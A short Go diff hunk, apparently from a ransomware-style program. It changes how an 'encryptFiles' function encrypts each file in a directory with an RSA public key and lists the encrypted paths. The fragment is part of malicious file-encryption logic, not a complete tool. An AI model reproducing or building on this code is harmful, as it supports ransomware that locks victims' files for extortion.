@@ -101,7 +101,7 @@ func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 	waitGroup.Add(1)
 	go func() {
 		for file := range filesToVisit {
-			err = file.Encrypt(cPubKey)
+			err = io.EncryptFile(&file, encryption.RSAAESEncrypt, cPubKey)
 			if err == nil {
 				encryptedList = append(encryptedList, file.Path)
 			}
